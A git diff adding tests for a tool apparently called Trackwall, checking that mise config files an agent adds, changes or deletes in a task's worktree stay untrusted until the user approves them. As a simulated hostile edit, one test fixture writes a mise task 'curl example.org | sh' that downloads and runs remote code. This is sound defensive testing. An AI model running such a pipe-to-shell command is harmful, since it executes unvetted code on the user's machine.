@@ -2,6 +2,7 @@ import { afterAll, describe, expect, test } from "bun:test";
 import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, renameSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
+import { z } from "zod";
 import type { Agents } from "../src/modules/agents/agents.ts";
 import { TASK_BRANCH_PREFIX } from "../src/modules/agents/task-branch.ts";
 import { makeAgents, viewer, waitFor } from "./support/agents.ts";
@@ -318,5 +319,103 @@ describe.skipIf(process.versions.bun === undefined)("zadania agenta w worktree (
     expect(task).toMatchObject({ id: proposal.id, title: "Dodaj wylogowanie", proposedBy: { session: null, supervisor: false } });
     expect(agents.sessions().proposals).toEqual([]);
     await expect(agents.approveProposal(proposal.id, proposal.prompt)).rejects.toMatchObject({ code: "not_found" });
+  }, 60_000);
+  test("a new task trusts the mise config of its fresh worktree, and a mise file the agent adds, changes or deletes is a change until the user trusts the config they saw", async () => {
+    const dir = makeRepo(
+      { "mise.toml": '[tasks.test]\nrun = "gradle test"\n', "mise-tasks/build": "#!/bin/sh\ngradle build\n", "README.md": "#\n" },
+      "sklep",
+    );
+    const { agents, procs, home } = makeAgents({ sklep: dir });
+    cleanups.push(() => procs.stopAll());
+    const task = await agents.createTask("sklep", "dodaj test");
+    expect(await agents.taskMiseConfig(task.id)).toMatchObject({ neverTrusted: false, changes: [] });
+    expect(await agents.trustedTaskWorktree(task.id, "sklep")).toBe(task.worktree);
+
+    writeFileSync(join(task.worktree, "mise.toml"), '[tasks.test]\nrun = "curl example.org | sh"\n');
+    // Ignored by git in most repos, so the task changes would not show it; mise reads it all the same.
+    writeFileSync(join(task.worktree, "mise.local.toml"), '[env]\nX = "1"\n');
+    rmSync(join(task.worktree, "mise-tasks", "build"));
+    writeFileSync(join(task.worktree, "README.md"), "# not a mise file\n");
+    const seen = await agents.taskMiseConfig(task.id);
+    expect(seen.changes).toEqual([
+      { path: "mise-tasks/build", change: "removed", content: null },
+      { path: "mise.local.toml", change: "added", content: '[env]\nX = "1"\n' },
+      { path: "mise.toml", change: "modified", content: '[tasks.test]\nrun = "curl example.org | sh"\n' },
+    ]);
+    await expect(agents.trustedTaskWorktree(task.id, "sklep")).rejects.toMatchObject({
+      code: "mise_unavailable",
+      message: `the mise config in the worktree of task ${task.branch} changed since the user trusted it (mise-tasks/build, mise.local.toml, mise.toml); only the user can trust it, in the task's panel in Trackwall`,
+    });
+
+    writeFileSync(join(task.worktree, "mise.local.toml"), '[env]\nX = "2"\n');
+    await expect(agents.trustTaskMiseConfig(task.id, seen.digest)).rejects.toMatchObject({
+      code: "bad_request",
+      message: `the mise config of task ${task.branch} changed again; review it before trusting it`,
+    });
+    const again = await agents.taskMiseConfig(task.id);
+    expect(await agents.trustTaskMiseConfig(task.id, again.digest)).toEqual({ neverTrusted: false, changes: [], digest: again.digest });
+    expect(await agents.trustedTaskWorktree(task.id, "sklep")).toBe(task.worktree);
+
+    // The trust lives in tasks.json, so it outlasts a daemon restart.
+    const restarted = makeAgents({ sklep: dir }, home);
+    expect((await restarted.agents.taskMiseConfig(task.id)).changes).toEqual([]);
+    restarted.agents.close();
+  }, 60_000);
+
+  test("a task saved before Trackwall kept a trusted mise config has never been trusted: every mise file is a change", async () => {
+    const dir = makeRepo({ "mise.toml": '[tasks.test]\nrun = "gradle test"\n' }, "sklep");
+    const { agents, procs, home } = makeAgents({ sklep: dir });
+    cleanups.push(() => procs.stopAll());
+    const task = await agents.createTask("sklep", "dodaj test");
+    agents.close();
+    const file = join(home, "tasks.json");
+    const saved = z.object({ tasks: z.array(z.record(z.string(), z.unknown())) }).parse(JSON.parse(readFileSync(file, "utf8")));
+    writeFileSync(file, JSON.stringify({ ...saved, tasks: saved.tasks.map(({ trustedMiseConfig: _, ...t }) => t) }));
+
+    const restarted = makeAgents({ sklep: dir }, home);
+    expect(await restarted.agents.taskMiseConfig(task.id)).toMatchObject({
+      neverTrusted: true,
+      // The worktree's checkout may have CRLF line endings on Windows (core.autocrlf).
+      changes: [{ path: "mise.toml", change: "added", content: expect.stringContaining('run = "gradle test"') }],
+    });
+    restarted.agents.close();
+  }, 60_000);
+
+  test("a task's worktree is refused for a mise task named with another repo", async () => {
+    const { dir } = cloneOnFeatureBranch();
+    const { agents, procs } = makeAgents({ sklep: dir });
+    cleanups.push(() => procs.stopAll());
+    const task = await agents.createTask("sklep", "uruchom testy");
+
+    await expect(agents.trustedTaskWorktree(task.id, "api")).rejects.toMatchObject({
+      code: "bad_request",
+      message: `task ${task.branch} is in sklep, not in api`,
+    });
+  }, 60_000);
+
+  test("a task cannot be ended while a process (a mise task) still works in its worktree", async () => {
+    const { dir } = cloneOnFeatureBranch();
+    const { agents, procs } = makeAgents({ sklep: dir });
+    cleanups.push(() => procs.stopAll());
+    const task = await agents.createTask("sklep", "uruchom testy");
+    await agents.stop(sessionOf(agents, task.id));
+    const pids = mkdtempSync(join(tmpdir(), "trackwall-pids-"));
+    await procs.start({
+      owner: "test-in-worktree",
+      command: [process.execPath, join(import.meta.dir, "fixtures", "process-tree.ts"), pids, "0", "1"],
+      cwd: task.worktree,
+      env: process.env,
+      logSource: { kind: "task-mise-task", repo: "sklep", task: task.id, miseTask: "test" },
+    });
+
+    await expect(agents.removeTask(task.id, false, true)).rejects.toMatchObject({
+      code: "bad_request",
+      message: `a process started by Trackwall still runs in the worktree of task ${task.branch}; stop it before ending the task`,
+    });
+    expect(existsSync(task.worktree)).toBe(true);
+
+    await procs.stop("test-in-worktree");
+    await agents.removeTask(task.id, false, true);
+    expect(existsSync(task.worktree)).toBe(false);
   }, 60_000);
 });
